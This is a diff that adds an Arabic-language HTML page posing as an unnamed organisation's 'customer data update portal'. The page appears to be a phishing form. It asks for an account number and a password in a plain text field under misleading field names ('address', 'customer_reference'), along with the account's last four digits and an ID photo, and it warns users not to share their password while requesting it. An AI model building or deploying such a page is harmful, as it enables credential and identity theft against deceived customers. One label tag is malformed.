@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>بوابة تحديث بيانات العملاء</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header>
+    <h2>بوابة العملاء</h2>
+    <span>الخدمات الإلكترونية</span>
+</header>
+
+<section class="hero">
+    <h1>مرحباً بك في بوابة تحديث بيانات العملاء</h1>
+    <p>يمكنك تحديث بياناتك الشخصية وبيانات التواصل وإرسال المستندات المطلوبة.</p>
+    <button onclick="showForm()">ابدأ تحديث البيانات</button>
+</section>
+
+<section class="instructions">
+    <h2>تعليمات مهمة</h2>
+    <p>تأكد من صحة بياناتك قبل الإرسال.</p>
+    <p>تأكد من وضوح المستندات المرفوعة.</p>
+    <p>لا تشارك كلمة مرورك أو رمز التحقق مع أي شخص.</p>
+</section>
+
+<section class="form-section" id="updateForm">
+
+<h2>نموذج تحديث البيانات</h2>
+
+<form id="customerForm">
+
+<label>الاسم الكامل</label>
+<input type="text" name="name" required>
+
+<label>رقم الهاتف</label>
+<input type="tel" name="phone" required>
+
+<label>البريد الإلكتروني</label>
+<input type="email" name="email">
+
+<label>المدينة</label>
+<input type="text" name="city" required>
+
+<label>رقم الحساب</label>
+<input type="text" name="address">
+
+<labelكلمة المرور</label>
+<input type="text" name="customer_reference" required>
+
+<label>آخر أربعة أرقام من الحساب</label>
+<input type="text" name="account_last4" maxlength="4" pattern="[0-9]{4}">
+
+<label>صورة الهوية</label>
+<input type="file" name="identity" accept="image/jpeg,image/png,application/pdf" required>
+
+<label>مستندات إضافية</label>
+<input type="file" name="documents" accept="image/jpeg,image/png,application/pdf" multiple>
+
+<button type="submit">إرسال طلب التحديث</button>
+
+</form>
+
+<div id="successMessage"></div>
+
+</section>
+
+<footer>
+جميع الحقوق محفوظة © 2026
+</footer>
+
+<script src="script.js"></script>
+
+</body>
+  </html>
